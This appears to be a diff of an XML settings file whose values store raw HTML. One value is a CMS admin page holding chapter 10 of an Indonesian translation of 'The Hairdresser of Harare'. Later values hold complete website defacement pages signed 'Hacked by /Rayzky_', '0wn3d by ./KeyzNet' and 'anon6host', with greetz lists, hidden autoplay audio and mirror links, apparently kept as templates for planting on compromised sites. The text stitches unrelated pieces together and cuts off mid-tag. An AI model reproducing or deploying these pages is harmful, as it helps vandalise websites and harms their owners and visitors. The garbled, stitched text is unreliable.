+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Berkerja menjadi sebuah cobaan hidup yang berat. Aku merasakan sakit badan setiap kali pergi bekerja di salon. Untuk menahan ketukan musik yang mematikan pikiran dan mereka semua terlihat lebih memilih penyiksaan itu sendiri. Salon menjadi lebih sibuk, nyatanya kita memiliki pelanggan yang lebih banyak yang telah terisi dalam buku perjanjian dari pada yang dapat kita tangani. Dumi tidak puas. DIa menurunkan poster lama yang telah terpasang di dinding dan menggantinya dengan yang lebih mengkilap yang katanya berasal dari Amerika. Di seberang kursiku ada poster dengan gambar wanita mini dengan kepang rambut yang rumit yang terpaksa harus aku lihat setiap hari. Sisi lainnya berwarna cerah, iklan berbagai gaya rambut yang tidak pernah aku lihat sebelumnya. Poster yang benar-benar menarik perhatianku adalah poster dengan lelaki yang tersenyum dan saling menatap mata dengan seorang perempuan, dibawahnya ada bungkusan femidom yang diikat dengan pita berwarna merah. Kami adalah salon dan bukan rumah bordil, Ya Tuhan. Bukan hanya dari menata rambut kita memperoleh uang, Ny Khumalo sekarang juga mendorong kita untuk menawarkan Femidom kepada perempuan yang duduk dilayani di kursi. Aku tidak pernah merasa lebih dari pelacur sepanjang hidupku, kemana aku harus pergi, adakah yang akan memperkerjakanku.Pikiran ini tercetus begitu saja.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Sepertinya ada yang kamu pikirkan. Kamu tidak seperti biasanya hari ini.&amp;quot; Lucy adalah satu dari pelangganku. Aku bersyukur dia tidak ikut-ikutan dengan pelanggan lain yang ingin ditata rambutnya oleh Dumisani.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Ini masa yang sulit, Saudariku.&amp;quot;&lt;br /&gt;
+&amp;quot;Ini berlaku untuk semua orang. Masa yang sulit tidak pernah membunuh.&amp;quot;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Tentu mudah baginya mengatakan itu, dengan suami dan keluarga yang sempurna. Aku pernah melakukan kepang cornrow (kepang kecil dan banyak ditata seperti barisan jagung) melintang disekeliling kepalanya.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Ah ini terlalu ketat.&amp;quot;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Maaf, akan aku longgarkan&amp;quot;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Dia pasti sedang memikirkan lelaki.&amp;quot; Komentar Agnes dengan sinis.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Kenapa kamu diam saja?&amp;quot; balasku.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Seseorang sedang suasana hati yang buruk hari ini. Bisa jadi benar hanya seorang lelaki!&amp;quot; Canda Dumi dengan mengedipkan matanya. Dan dia benar ini adalah lelaki dan itu adalah dia.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Kamu tahu aku hanya menggodamu Vimbai.&amp;quot; Dia mencoba menenangkanku.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Aku sedang tidak berada dalam suasana hati memaafkan dan mengabaikannya, aku sedang bekonsentrasi dengan kepala didepanku. Aku harus menggerakkan jemari tanganku sesuai keinginku secara sadar fokus dengan apa yang aku kerjakan. Mengingat sebelum kedatangan Dumi semua bergerak alami seperti berjalan. Seperti sekarang aku baru sadar ada kekurangan dalam pekerjaanku tidak seperti sebelumnya, Satu baris kepang cornrow lebih terbal dari yang lainnya. Aku bongkar perlahan dan aku perbaiki. Lucy gelisah. Aku tahu dia berpikir kepangannya terlalau ketat. Namun aku selalu menyelesaikannya. iIni menjadi masalah yang membuatku merasa tidak enak.&amp;nbsp; Apakah aku pernah melakukan kesalahan ini bertahum-tahun?&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Lucy tersentak. &lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Aku lupa memberitahumu bahwa Abbas dan Anak Lelakinya akan mendapatakan pengiriman gula besuk.&amp;quot;&lt;br /&gt;
+&amp;quot;Apakah toko itu ada di pusat kota?&amp;quot;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Ada di Rezende.&amp;quot;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Bisakah kamu mengusahakan beberapa untuk kami?&amp;quot;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Saudara lelakiku berkerja disana dan aku ada disana besuk pagi, kamu harus menyuruh orang untuk menemuiku pagi besuk.&amp;quot;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Kami akan kirim...&amp;quot;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot; Satu dari kalian harus datang karena harus yang aku kenal, karena besuk kalian juga harus belkerja di salaon baiknya satu orang saja yang menemuiku.&amp;quot;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Itu adalah pusat jaringan dimana kamu dapat mendengar apa yang sedang terjadi. Penting ketika permintaan sangat singat. Tepung Jagung, gula, garam, minyak goreng adalah kebutuhan pokok yang sangat dibutuhkan khususnya ketika bisa mendapatkan harga murah dan menjualnya kembali ke pasar gelap untuk mendapatkan keuntungan cepat, Aku mengajukan diri untuk bertemu Lucy besuk.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Keesokan paginya aku berangkat dari rumah lebih awal, memastikan Maidei memanaskan air untuk mandi Chiwoniso. AKu mematikan pemanas air untuk menghemat listrik. Dan harus dilakukan sampai segeala sesuatunya ada peningkatan. Aku dapat tumpangan dari seorang lelaki dan menurunkannya di kantor pos utama, Butuh waktu untuk menyeberang jalan karena lampu lalu lintas tidak berfungsi dan tidak ada yang mau mengalah kepada penyebrang jalan Jason Moyo Avenue. Dengan Heroik aku berlari berkelok-kelok menghindari kendaraan yang melaju mengetahui ada pejalan kaki yang memerlukan perhatian. Aku berhenti untuk mengatur napas, bersandar di pagar yang membentengi Balai Kota. Bangunan Tua peninggalan kolonial dengan kejayaannya seakan mengejek kemerdekaan Zibabwe yang tidak bisa berbuat apa-apa karena gedung itu masih berfungsi sebagai Balai Kota. Sementara bendera Zibabwe terkulai lemah di langit yang berkabut asap.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Ada ciri aneh didepan alun-alun. Yaitu berupa bola dari logam keperakan dengan paku yang dibuat oleh Murid Tingkat D Level O yang terkesan tergesa-gesa dalm pembuatannya. Air Mancur yang tidak pernah mengalir airnya. Dan berdasarkan ingatanku biaya untuk pembuatannya hampir mendekati satu juta, saat itu cukup mahal walaupun sekarang satu juta tidak lebih untuk membeli satu potong roti. Dan itu cepat rusak hanya berselang satu bulan setelah diresmikan. Semua di balai Kota telah rusak kecuali Mercs resmi yang dipasang di gerbang keluar masuk. yang menunjukkan ada bisnis penting di dalamnya.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Yang mengejutkan bagaimana hanya sepuluh persen dari jumlah penduduk yang memiliki pekerjaan, jalanan penuh dengan orang saat berpapasan tadi pagi. Aku sempat bertemu dengan orang yang hanya menjual perment dan sebatang rokok saat berbelok di Jalan Robert Mugabe. Dari situ beberapa langkah lagi memasuki jalan Rezende. Abbas dan Sons toko India satu dari beberapa toko di kota. Ada enam puluh orang dalam antrian disana, Sebuah tangan mencolekku dari belakang. Dengan cepat aku menoleh kebelakang sambial memeluk erat tasku.&amp;nbsp; &lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Ini aku.&amp;quot; Kata Lucy. Dia mengenakan bandana dari sapu tangan untuk menutupi rambutnya seolah-olah malu dengan gaya rambutnya yang telah kutata kurang dari 24 jam sebelumnya. &lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Mana uanganya?&amp;quot; Dia mengambil uang yang kupegang dan memasukkannya kedalam dompet yang berupa tas besar. Dia tidak perlu mneghitungnya. Kita dapat mengetahui jumlah uang dari beratnya. Tidak masalah walaupun jumlahnya kurang beberapa ratus ribu. Nilai uangpun akan turun dari jam ke jam.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Selamat Pagi.&amp;quot; Kataku padanya&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Ayo memutar ke belakang.&amp;quot; Dia berbisik. &lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Kami melangkah melewati tumpukan sampah dan menghindari genangan air berwarna cokelat saat menyusuri jalan belakang. Lucy memperhatikan sekeliling kawatir ada seseorang yang mengikuti kami. Dia menyalakan ponsel, membisikan beberapa kata dengan cepat dan mematikan ponsel.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Tunggu sebentar dia akan segera keluar.&amp;quot;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Segera setelah satu setengah jam pintu tiba-tiba terbuka dan lelaki kurus dengan wajah bersinar melangkah keluar.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Chop-chop.&amp;quot; Dia berkata sambil menyodorkan tas kepadanya dan mengabil uang dengan gerakan yang cepat. Jantungku berdegup kencang layaknya kami sedang bertransaksi narkoba. Segera setelah selesai lelaki itu masuk kembali kedalam dan menutup pintu. Dan kami telah mendapatkan gula. Lucy memberiku tiga bungkusan dua kilogram berwarna putih dan satu bungkus dua kilogram berwarna coklat. Pertama aku harus kembali ke salon, dan membagi bungkusan ini menjadi bagian yang lebih kecil sekitar satu kilogram atau kurang per bungkus karena kami harus berbagi dengan teman-teman yang telah iuran uang untuk mendapatkan gula ini seperti yang diumumkan Lucy kemarin. Aku menuju jalan dan melihat antrian mejadi dua kali lebih panjang mengular sampai jalan Robert Mugabe. Orang-orang saling dorong. Sekelompok polisi dengan tongkat terlihat di depan dan mengatur antrian dan memastikan semuanya tetap di tempat antriannya. kenyataannya mereka memberikan waktu kepada beberapa orang untuk berdiri didepan antrian mereka. Aku kembali dengan tersenyum dan merasa seperti malaikat, andai saja tidak ada bungkusan di kanan kiriku tentu aku sudah melayah diatas gedung pencakar langit.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&amp;nbsp;&lt;/p&gt;
+&lt;/textarea&gt;
+														 &lt;script type="text/javascript"&gt;
+															CKEDITOR.replace( 'konten' );
+														 &lt;/script&gt;
+														
+													&lt;/div&gt;
+												&lt;/div&gt;
+											&lt;/div&gt;
+							
+						  
+                          
+				
+				      &lt;/div&gt;
+				      &lt;div class="modal-footer"&gt;
+				        &lt;button type="button" class="btn btn-danger" data-dismiss="modal"&gt;&lt;i class="fa fa-arrow-circle-left"&gt;&lt;/i&gt; Kembali&lt;/button&gt;
+				        &lt;button type="submit" class="btn btn-primary" name="update"&gt;&lt;i class="fa fa-clone"&gt;&lt;/i&gt; Simpan&lt;/button&gt;
+				       &lt;/form&gt;
+				      &lt;/div&gt;
+				    &lt;/div&gt;
+				  &lt;/div&gt;
+				&lt;/div&gt;
+                &lt;!-- Akhir edit data --&gt;
+	&lt;!-- Hapus data --&gt;
+				
+
+				&lt;div class="modal fade bs-example-modal-lg28" tabquestion="-1" role="dialog" aria-labelledby="myLargeModalLabel"&gt;
+				  &lt;div class="modal-dialog modal-lg" role="document"&gt;
+				    &lt;div class="modal-content"&gt;
+					&lt;div class="modal-header"&gt;
+						&lt;h3 class="modal-title"&gt;Konfirmasi&lt;/h3&gt;
+					&lt;/div&gt;
+				      &lt;div class="modal-body"&gt;
+				        &lt;h4&gt;Apakah anda benar-benar ingin menghapus data ini ?&lt;/h4&gt;
+				        &lt;form action="" method="POST"&gt;
+				        &lt;input type="hidden" name="id" value="28"&gt;
+				      &lt;/div&gt;
+				       &lt;div class="modal-footer"&gt;
+				        &lt;button type="button" class="btn btn-danger" data-dismiss="modal"&gt;&lt;i class="fa fa-arrow-circle-left"&gt;&lt;/i&gt; Kembali&lt;/button&gt;
+				        &lt;button type="submit" class="btn btn-primary" name="hapus"&gt;&lt;i class="fa fa-trash"&gt;&lt;/i&gt; Hapus&lt;/button&gt;
+				       &lt;/form&gt;
+				      &lt;/div&gt;
+				    &lt;/div&gt;
+				  &lt;/div&gt;
+				&lt;/div&gt;
+				&lt;!-- Akhir hapus data --&gt;
+				&lt;div class="modal fade bs-aktif-modal-lg28" tabquestion="-1" role="dialog" aria-labelledby="myLargeModalLabel"&gt;
+				  &lt;div class="modal-dialog modal-lg" role="document"&gt;
+				    &lt;div class="modal-content"&gt;
+				      &lt;div class="modal-header"&gt;
+							&lt;h3 class="modal-title"&gt;Konfirmasi&lt;/h3&gt;
+						&lt;/div&gt;
+				      &lt;div class="modal-body"&gt;
+				        &lt;h4&gt;Publish Artikel ini?&lt;/h4&gt;
+				        &lt;form action="" method="POST"&gt;
+				        &lt;input type="hidden" name="id" value="28"&gt;
+				      &lt;/div&gt;
+				       &lt;div class="modal-footer"&gt;
+				        &lt;button type="button" class="btn btn-danger" data-dismiss="modal"&gt;&lt;i class="fa fa-arrow-circle-left"&gt;&lt;/i&gt; Kembali&lt;/button&gt;
+				        &lt;button type="submit" class="btn btn-primary" name="publish"&gt;&lt;i class="fa fa-bullhorn"&gt;&lt;/i&gt; Publish&lt;/button&gt;
+				       &lt;/form&gt;
+				      &lt;/div&gt;
+				    &lt;/div&gt;
+				  &lt;/div&gt;
+				&lt;/div&gt;
+	&lt;!--artikel--&gt;
+	&lt;div class="jumbotron"&gt;
+	&lt;div class="row"&gt;
+	&lt;div class="col-sm-3"&gt;
+	&lt;img src="../images/image_27.jpg" alt="Avatar" class="avatar"&gt; 
+	&lt;/div&gt;
+	&lt;div class="col-sm-9"&gt;
+	&lt;h3 class="display-5"&gt;Sang Penata Rambut Harare (Bab 10)&lt;/h3&gt;
+	 &lt;p class="lead" align="justify"&gt;
+	  &lt;i class="fa fa-calendar"&gt;&lt;/i&gt;  October 01, 2020&lt;/a&gt;
+	  &lt;i class="fa fa-folder"&gt;&lt;/i&gt;  Novel&lt;/a&gt;
+	  &lt;i class="fa fa-eye"&gt;&lt;/i&gt;  162 Views&lt;/a&gt;
+	  &lt;/p&gt;
+	&lt;/div&gt;
+	&lt;/div&gt;
+	 
+	 
+	  &lt;hr class="my-4"&gt;
+	 &lt;p align="justify"&gt;
+	 &lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&lt;span style="color:black"&gt;&lt;strong&gt;&lt;em&gt;The Hairdresser of Harare&lt;/em&gt; sebuah karya sastra karangan Tendai Huchu, pertama kali dipublikasikan tahun 2010. Mengisahkan kehidupan Zimbabwe Kontemporer dilihat dari sudut pandang Sang Penata Rambut yang bekerja di sebuah Salon di Kota Harare.&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;	  &lt;/p&gt;
+	  &lt;hr class="my-4"&gt;
+		&lt;button type="button" class="btn btn-info  btn-md" data-target="#tambahData" data-toggle="modal"&gt;&lt;span class="icon-plus mr-2"&gt;&lt;/span&gt;&lt;i class="fa fa-plus"&gt;&lt;/i&gt;  New!&lt;/button&gt;
+				&lt;a href="#" class="btn btn-success btn-md" data-toggle="modal" data-target="#edit27" title="Edit Data"&gt;&lt;span class="glyphicon glyphicon-pencil"&gt;&lt;/span&gt;&lt;i class="fa fa-edit"&gt;&lt;/i&gt; Edit&lt;/a&gt;
+				
+		&lt;a href="#" class="btn btn-warning btn-md" title="Aktif Data" data-target=".bs-aktif-modal-lg27" data-toggle="modal"&gt;&lt;span class="glyphicon glyphicon-check"&gt;&lt;/span&gt;&lt;i class="fa fa-bullhorn"&gt;&lt;/i&gt; Publish&lt;/a&gt;
+			&lt;/div&gt;
+	&lt;!--artikel--&gt;
+	&lt;!-- Edit Data --&gt;
+			    &lt;div class="modal fade bs-example-modal-lg" id="edit27" tabquestion="-1" role="dialog" aria-labelledby="myModalLabel"&gt;
+				  &lt;div class="modal-dialog  modal-lg" role="document"&gt;
+				    &lt;div class="modal-content"&gt;
+				      &lt;div class="modal-header"&gt;
+							&lt;h3 class="modal-title"&gt;Edit Artikel&lt;/h3&gt;
+						&lt;/div&gt;
+				      &lt;div class="modal-body"&gt;
+				        &lt;form class="form-horizontal" action="" method="POST"&gt;
+				          &lt;input type="hidden" name="id" value="27"&gt;
+							&lt;label for="kategori"&gt;Kategori Artikel&lt;/label&gt;
+									&lt;div class="row"&gt;
+									&lt;div class='col-sm-8'&gt;
+									&lt;div class="form-group"&gt;
+									&lt;select class="form-control" id="kategori" name="kategori"&gt;
+										&lt;option value="Biografi" &gt;Biografi&lt;/option&gt;
+										&lt;option value="Motivasi" &gt;Motivasi&lt;/option&gt;
+										&lt;option value="Novel" selected&gt;Novel&lt;/option&gt;
+										&lt;option value="Religi" &gt;Religi&lt;/option&gt;
+										&lt;option value="Resensi" &gt;Resensi&lt;/option&gt;
+										&lt;option value="Teknologi Informasi" &gt;Teknologi Informasi&lt;/option&gt;
+										
+									&lt;/select&gt;			
+									&lt;/div&gt;
+									&lt;/div&gt;
+									&lt;/div&gt;			
+									&lt;label for="judul"&gt;Judul&lt;/label&gt;
+									&lt;div class="row"&gt;
+									&lt;div class='col-sm-8'&gt;
+									&lt;div class="form-group"&gt;
+									&lt;input type="text" class="form-control" name="judul" value="Sang Penata Rambut Harare (Bab 10)" required&gt;			
+									&lt;/div&gt;
+									&lt;/div&gt;
+									&lt;/div&gt;
+									
+									
+									&lt;script type="text/javascript" src="../ckeditor/ckeditor.js"&gt;&lt;/script&gt;
+									&lt;script type="text/javascript" src="../ckeditor/style.js"&gt;&lt;/script&gt;
+									&lt;label for="konten"&gt;Konten&lt;/label&gt;
+											&lt;div class="row"&gt;
+												&lt;div class='col-sm-12'&gt;
+													&lt;div class="form-group"&gt;
+														&lt;textarea name="konten"&gt;&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&lt;span style="color:black"&gt;&lt;strong&gt;&lt;em&gt;The Hairdresser of Harare&lt;/em&gt; sebuah karya sastra karangan Tendai Huchu, pertama kali dipublikasikan tahun 2010. Mengisahkan kehidupan Zimbabwe Kontemporer dilihat dari sudut pandang Sang Penata Rambut yang bekerja di sebuah Salon di Kota Harare.&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&lt;span style="color:black"&gt;Musik di salon berubah ke Urban Grooves, Hip Hop bernuansa lokal yang kurang be</Value>
+    </Setting>
+    <Setting Name="Index12" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;!DOCTYPE html&gt;
+&lt;html lang='en' class=''&gt;
+  &lt;meta charset=UTF-8&gt;
+    &lt;title&gt;Hacked by /Rayzky_&lt;/title&gt;
+    &lt;link rel="icon" type="image/png" href="https://static.wixstatic.com/media/7ac599_d79a8b13512141b6887311dc4af1babb~mv2.jpg/v1/fill/w_640,h_704,al_c,q_85,usm_0.66_1.00_0.01/7ac599_d79a8b13512141b6887311dc4af1babb~mv2.webp"/&gt;
+     &lt;title&gt;Hacked by /Rayzky_&lt;/title&gt;
+     &lt;meta name="google-site-verification" content="Hacked by /Rayzky_	- IndonesianPride"/&gt;
+     &lt;meta name="theme-color" content="black"&gt;
+     &lt;meta http-equiv="Content-Type" content="text/html; charset=Windows-1254"/&gt;
+     &lt;meta name="description" content="Hacked by /Rayzky_	- IndonesianPride"&gt;
+     &lt;meta name="author" content="Hacked by /Rayzky_	- IndonesianPride"/&gt;
+     &lt;meta name="keywords" content="Hacked by /Rayzky_	- IndonesianPride"/&gt;
+     &lt;meta name="googlebot" content="all"/&gt;
+     &lt;meta name="robots" content="all" /&gt;
+     &lt;meta name="googlebot-news" content="all" /&gt;
+     &lt;meta name="google" content="notranslate"/&gt;
+     &lt;meta name="og:title" content="Hacked by /Rayzky_"/&gt;
+     &lt;meta property="og:image" content="https://static.wixstat
+&lt;/head&gt;    &lt;meta charset='UTF-8'&gt;
+    &lt;meta name="robots" content="noindex"&gt;
+    &lt;style&gt;
+      body {
+        background: #222;
+        font-family: "Helvetica Neue", "Helvetica", Arial, "Lucida   Grande", sans-serif;
+      }
+      h2 {
+        font-size: 2em;
+        font-weight: 100;
+        letter-spacing: 1em;
+        text-transform: uppercase;
+        text-shadow: 0px 0px 20px #6EC3EC;
+      }
+
+      h3 {
+        font-size: 1.5em;
+        font-weight: 100;
+        letter-spacing: 1em;
+        text-transform: uppercase;
+        text-shadow: 0px 0px 20px #6EC3EC;
+        color: #6EC3EC;
+        display: inline-block;
+      }
+
+      h3:nth(1) {
+        animation: bounce 1s ease-in-out forwards;
+      }
+
+	  h4 {
+        font-size: 0.5em;
+        font-weight: 50;
+        letter-spacing: 1em;
+        text-transform: uppercase;
+        text-shadow: 0px 0px 20px #6EC3EC;
+      }
+
+      .container {
+        font-size: 16px;
+        top: 30%;
+        left: 20%;
+        position: absolute;
+        color: #fff;
+        text-align: center;
+      }
+
+      .bar {
+        height: .3em;
+        width: 30em;
+        border-radius: 10px;
+        background: transparent;
+        box-shadow: inset 0px 0px 8px #323232;
+        overflow: hidden;
+        padding: 20px;
+          margin: 0 auto;
+      }
+
+      .progress {
+        height: inherit;
+        border-radius: inherit;
+        width: 0;
+        background: #6EC3EC;
+        animation: load 3s linear infinite;
+        animation-delay: 2s;
+      }
+
+      @keyframes bounce {
+        0% {
+          transform: translateY(0px);
+        }
+        50% {
+          transform: translateY(-100px);
+        }
+        100% {
+          transform: translateY(0px);
+        }
+      }
+
+      @keyframes load {
+        0% {
+          width: 0%;
+        }
+        50% {
+          width: 100%;
+        }
+        100% {
+          width: 0%;
+          float: right;
+        }
+      }
+
+    &lt;/style&gt;
+  &lt;/head&gt;
+
+  &lt;body&gt;
+    &lt;div class="container"&gt;
+        &lt;h2&gt;HACKED by /Rayzky_&lt;/h2&gt;
+      &lt;h3&gt;INDONESIAN HACKER RULEZ&lt;/h3&gt;
+      &lt;div class="bar"&gt;
+        &lt;div class="progress"&gt;&lt;/div&gt;
+      &lt;/div&gt;
+	  &lt;h5&gt;Greetz: Jenderal92 - White System'./404 - Mr.!Root317 - KingTime404 &lt;/h5&gt;
+	  &lt;h5&gt; SINCE 2019 &lt;/h5&gt;
+    &lt;/div&gt;
+    &lt;script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt;
+  &lt;/body&gt;
+
+&lt;/html&gt;
+</Value>
+    </Setting>
+    <Setting Name="Index13" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;HTML&gt;
+	&lt;head&gt;
+		&lt;title&gt;0wn3d by ./KeyzNet | 407 Authentic Exploit&lt;/title&gt;
+		&lt;meta http-equiv="content-type" content="text/html;charset=utf-8" /&gt;
+		&lt;meta name="viewport" content="width=device-width, initial-scale=0.65"&gt;
+		&lt;meta name="description" content="407 Authentic Exploit | Security Get Down!" /&gt;
+		&lt;meta name="keywords" content="./KeyzNet,407 Authentic Exploit,keyznet"/&gt;
+		&lt;link rel="icon" type="image/jpg" href="https://i.ibb.co/YfZY640/1560410854-picsay.jpg?auto=compress&amp;cs=tinysrgb&amp;h=650&amp;w=940"/&gt;
+		&lt;link rel="preconnect" href="https://fonts.googleapis.com"/&gt;
+		&lt;link rel="preconnect" href="https://fonts.gstatic.com" crossorigin&gt;
+		&lt;link href="https://fonts.googleapis.com/css2?family=Martian+Mono:wght@300&amp;display=swap" rel="stylesheet"/&gt;
+		&lt;link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital,wght@1,300&amp;display=swap" rel="stylesheet"&gt;
+		&lt;link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@1,200&amp;display=swap" rel="stylesheet"&gt;
+		&lt;link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"&gt;
+	&lt;body bgcolor=black onclick="play()"&gt;
+		&lt;div class="content" style="width: 100%;top: 0;left: 0;right: 0;bottom: 0;height: 70%;margin: auto;position: absolute;"/&gt;
+		&lt;center&gt;
+			&lt;img src="https://l.top4top.io/p_2633n5tnb0.gif" alt="./KeyzNet"  style="width:500px"&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
+			&lt;h1&gt;&lt;p style="font-family:Poppins;color:white;size:10px"&gt;0wn3d by &lt;font color="white"&gt;./KeyzNet&lt;/font&gt;&lt;/font&gt;&lt;/h1&gt;
+			&lt;font size="4px" face="Martian Mono" color="white"&gt;&lt;b&gt;407 AUTHENTIC EXPLOIT&lt;/font&gt;&lt;/b&gt;&lt;/br&gt;&lt;br&gt;
+        &lt;p style="font-size:20px;color:#0088cc;" class="fa"&gt;&amp;#xf2c6;&lt;/style&gt;&lt;a href="https://t.me/keyznet" style="text-decoration: none;size:4px;color:#0088cc;"&gt; Contact Me&lt;/a&gt;
+			&lt;audio id="sec" __idm_id__="823202817"&gt;&lt;source src="https://e.top4top.io/m_2663bo2gi1.mp3" type="audio/mpeg"&gt;&lt;/audio&gt;
+		&lt;/center&gt;
+		&lt;/div&gt;
+	&lt;/body&gt;
+	  &lt;script&gt;
+    var x = document.getElementById("sec");
+    function play() {
+      x.play(); 	
+    }
+  &lt;/script&gt;
+&lt;/html&gt;
+			</Value>
+    </Setting>
+    <Setting Name="Index14" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;head&gt; &lt;title&gt;powned by anon6host&lt;/title&gt; &lt;link rel="icon" type="image/png" href="https://cdn.pbrd.co/images/GrIldsnJ2.png" /&gt; &lt;meta name="og:description" content="hacked by anon6host" /&gt; &lt;meta name="og:image" content="https://cdn.pbrd.co/images/GrIldsnJ2.png" /&gt; &lt;meta name="og:title" content="hckd by anon6host" /&gt; &lt;meta charset='utf-8' /&gt; &lt;meta name="robots" content="all" /&gt; &lt;meta name="keyword" content="z3r0-team" /&gt; &lt;meta name="author" content="anon6host." /&gt; &lt;meta name="googlebot" content="auto" /&gt; &lt;meta name="distribution" content="global" /&gt; &lt;script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"&gt;&lt;/script&gt; &lt;link href="https://zonehmirrors.org/defaced/2017/06/15/www.bendigodogtraining.com.au/www.jqueryscript.net/demo/jQuery-Plugin-For-Sakura-Petals-Falling-Animation-Sakura/jquery-sakura.css" rel="stylesheet" type="text/css"&gt; &lt;/head&gt; &lt;audio controls autoplay hidden loop src="https://www.neoanime.co.kr/ost/files/attach/images/446/910/225/008/72938e2141cba646d52fc958a8030856.mp3" type="audio/mpeg"&gt;&lt;/audio&gt; &lt;body&gt; &lt;style&gt; html {cursor:none;background: #000000 100%;background-size: cover;background-attachment: fixed;font-family: Courier New;font-size: 12px;overflow:hidden;} #tlc{font:40px Courier New;font-weight:bold;color:white;position:absolute;left:0;right:0;top:20%;} img {opacity: 0.8;filter: alpha(opacity=50);} img:hover {opacity: 1.0;filter: alpha(opacity=100);} body { -webkit-animation: background 10s cubic-bezier(1,0,0,1) infinite; animation: background 15s cubic-bezier(1,0,0,1) infinite; } img:hover {opacity: 1.0;filter: alpha(opacity=100);} &lt;/style&gt; &lt;script&gt; $(window).load(function () { $('body').sakura(); }); &lt;/script&gt;  &lt;/head&gt; &lt;span id='tlc'&gt; &lt;center&gt; &lt;img src="https://s0.smartresize.com/wallpaper/432/229/HD-wallpaper-anime-street-road-buildings-scenery-night-stars-anime.jpg" height="300"&gt;&lt;br&gt; &lt;font face="Courier" size="5" color="white" style="text-shadow: 0 0 3px black, 0px 0px 5px black;"&gt;&lt;br&gt;hacked By &lt;b style="text-shadow: 0 0 3px red, 0px 0px 5px red;"&gt;anon6host&lt;/b&gt;&lt;br&gt;&lt;font size="3" color="white" style="text-shadow: 0 0 3px black, 0px 0px 5px black;"&gt;&lt;br&gt;z3r0-team :&lt;br&gt;KosameAmegai - w4nnatry - Rozamyne - N4Y4 -
